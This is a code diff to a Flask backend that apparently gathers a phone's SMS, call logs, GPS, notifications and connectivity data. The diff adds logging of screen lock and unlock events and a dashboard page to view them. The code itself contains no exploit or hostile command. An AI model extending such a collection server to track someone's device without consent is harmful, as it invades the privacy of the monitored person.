@@ -233,6 +233,8 @@ class Device(db.Model):
     last_connectivity_state = db.Column(db.String(32))
     last_connectivity_reason = db.Column(db.String(64))
     last_connectivity_timestamp = db.Column(db.DateTime)
+    last_screen_state = db.Column(db.String(32))
+    last_screen_timestamp = db.Column(db.DateTime)
 
 
     @property
@@ -319,6 +321,17 @@ class ConnectivityLog(db.Model):
     is_airplane_mode = db.Column(db.Boolean, default=False)
     is_wifi_enabled = db.Column(db.Boolean, default=True)
     is_mobile_data_enabled = db.Column(db.Boolean, default=True)
+    occurred_at = db.Column(db.DateTime, nullable=False, index=True)
+    synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
+
+
+class ScreenLog(db.Model):
+    __tablename__ = 'screen_logs'
+    id = pk_column()
+    device_id = db.Column(db.String(64), nullable=False, index=True)
+    event_type = db.Column(db.String(32), nullable=False, index=True)  # "UNLOCKED", "LOCKED", "SCREEN_ON"
+    is_interactive = db.Column(db.Boolean, default=True)
+    is_keyguard_locked = db.Column(db.Boolean, default=False)
     occurred_at = db.Column(db.DateTime, nullable=False, index=True)
     synced_at = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))
 
@@ -1175,13 +1188,60 @@ def device_ping():
         except Exception:
             pass
 
+    # Process batched Screen Lock / Unlock events piggybacked on heartbeat ping
+    received_screen_events = []
+    if 'screen_events' in data and isinstance(data['screen_events'], list):
+        for s in data['screen_events']:
+            try:
+                local_id = s.get('local_id')
+                raw_ts = s.get('occurred_at', 0)
+                occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
+                event_type = s.get('event_type', 'UNLOCKED')
+                is_interactive = bool(s.get('is_interactive', True))
+                is_keyguard_locked = bool(s.get('is_keyguard_locked', False))
+
+                dup = ScreenLog.query.filter(
+                    ScreenLog.device_id == device_id,
+                    ScreenLog.event_type == event_type,
+                    ScreenLog.occurred_at >= occurred_at - timedelta(seconds=5),
+                    ScreenLog.occurred_at <= occurred_at + timedelta(seconds=5)
+                ).first()
+
+                if not dup:
+                    screen_entry = ScreenLog(
+                        device_id=device_id,
+                        event_type=event_type,
+                        is_interactive=is_interactive,
+                        is_keyguard_locked=is_keyguard_locked,
+                        occurred_at=occurred_at,
+                        synced_at=now
+                    )
+                    db.session.add(screen_entry)
+
+                if local_id is not None:
+                    received_screen_events.append(local_id)
+
+                if not device.last_screen_timestamp or occurred_at >= device.last_screen_timestamp:
+                    device.last_screen_state = event_type
+                    device.last_screen_timestamp = occurred_at
+            except Exception as e:
+                app.logger.error(f"Error parsing Screen item in ping: {e}")
+
+    if 'screen_state' in data and data['screen_state']:
+        device.last_screen_state = data['screen_state']
+        if not device.last_screen_timestamp:
+            device.last_screen_timestamp = now
+
     db.session.commit()
 
-    return jsonify({
+    ping_resp = {
         'status': 'ok',
         'server_time': now.isoformat(),
         'ping_interval_sec': 300
-    })
+    }
+    if received_screen_events:
+        ping_resp['received'] = {'screen_events': received_screen_events}
+    return jsonify(ping_resp)
 
 
 @app.route('/api/v1/sync', methods=['POST'])
@@ -1227,6 +1287,7 @@ def sync_data():
     received_sms_ids = []
     received_gps_ids = []
     received_connectivity_ids = []
+    received_screen_ids = []
 
     new_notifications = []
     new_call_logs = []
@@ -1449,6 +1510,43 @@ def sync_data():
         except Exception as e:
             app.logger.error(f"Error parsing Connectivity item: {e}")
 
+    # Process Screen Lock / Unlock events (with deduplication)
+    for s in data.get('screen_events', []):
+        try:
+            local_id = s.get('local_id')
+            raw_ts = s.get('occurred_at', 0)
+            occurred_at = datetime.fromtimestamp(raw_ts / 1000.0, tz=timezone.utc) if raw_ts > 0 else now
+            event_type = s.get('event_type', 'UNLOCKED')
+            is_interactive = bool(s.get('is_interactive', True))
+            is_keyguard_locked = bool(s.get('is_keyguard_locked', False))
+
+            dup = ScreenLog.query.filter(
+                ScreenLog.device_id == device_id,
+                ScreenLog.event_type == event_type,
+                ScreenLog.occurred_at >= occurred_at - timedelta(seconds=5),
+                ScreenLog.occurred_at <= occurred_at + timedelta(seconds=5)
+            ).first()
+
+            if not dup:
+                screen_entry = ScreenLog(
+                    device_id=device_id,
+                    event_type=event_type,
+                    is_interactive=is_interactive,
+                    is_keyguard_locked=is_keyguard_locked,
+                    occurred_at=occurred_at,
+                    synced_at=now
+                )
+                db.session.add(screen_entry)
+
+            if local_id is not None:
+                received_screen_ids.append(local_id)
+
+            if not device.last_screen_timestamp or occurred_at >= device.last_screen_timestamp:
+                device.last_screen_state = event_type
+                device.last_screen_timestamp = occurred_at
+        except Exception as e:
+            app.logger.error(f"Error parsing Screen item in sync: {e}")
+
     db.session.commit()
 
     # Send Discord webhooks ONLY for genuinely new items (not duplicates)
@@ -1460,6 +1558,7 @@ def sync_data():
             send_discord_for_sms(new_sms_messages, device_id)
             send_discord_for_gps(new_gps_events, device_id)
             send_discord_for_connectivity(new_connectivity_events, device_id)
+            # Screen events are deliberately silent (no Discord webhook)
         except Exception:
             app.logger.warning("Error in background Discord dispatch", exc_info=True)
 
@@ -1475,7 +1574,8 @@ def sync_data():
             'call_logs': received_call_log_ids,
             'sms_messages': received_sms_ids,
             'gps_events': received_gps_ids,
-            'connectivity_events': received_connectivity_ids
+            'connectivity_events': received_connectivity_ids,
+            'screen_events': received_screen_ids
         }
     })
 
@@ -1696,6 +1796,33 @@ def dashboard_connectivity():
                            current_device=device_filter,
                            current_state=state_filter,
                            current_reason=reason_filter)
+
+
+@app.route('/dashboard/screen')
+@require_login
+def dashboard_screen():
+    """Screen & Lock State History view (UNLOCKED / In Use, LOCKED, SCREEN_ON)."""
+    state_filter = request.args.get('state')
+    device_filter = session.get('selected_device_id')
+    page = request.args.get('page', 1, type=int)
+    per_page = 50
+
+    query = db.session.query(ScreenLog, Device.device_model).outerjoin(Device, ScreenLog.device_id == Device.device_id)
+
+    if device_filter:
+        query = query.filter(ScreenLog.device_id == device_filter)
+    if state_filter in ['UNLOCKED', 'LOCKED', 'SCREEN_ON']:
+        query = query.filter(ScreenLog.event_type == state_filter)
+
+    pagination = query.order_by(ScreenLog.occurred_at.desc()).paginate(page=page, per_page=per_page, error_out=False)
+    devices = Device.query.order_by(Device.last_ping.desc().nullslast()).all()
+
+    return render_template('screen.html',
+                           screen_logs=pagination.items,
+                           pagination=pagination,
+                           devices=devices,
+                           current_device=device_filter,
+                           current_state=state_filter)
 
 
 
@@ -2652,6 +2779,8 @@ with app.app_context():
             conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_connectivity_state VARCHAR(32);"))
             conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_connectivity_reason VARCHAR(64);"))
             conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_connectivity_timestamp TIMESTAMP;"))
+            conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_screen_state VARCHAR(32);"))
+            conn.execute(text("ALTER TABLE devices ADD COLUMN IF NOT EXISTS last_screen_timestamp TIMESTAMP;"))
             conn.execute(text("ALTER TABLE call_logs ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
             conn.execute(text("ALTER TABLE sms_messages ADD COLUMN IF NOT EXISTS sim_slot VARCHAR(64);"))
             conn.execute(text("ALTER TABLE cdr_statements ADD COLUMN IF NOT EXISTS file_hash VARCHAR(64);"))
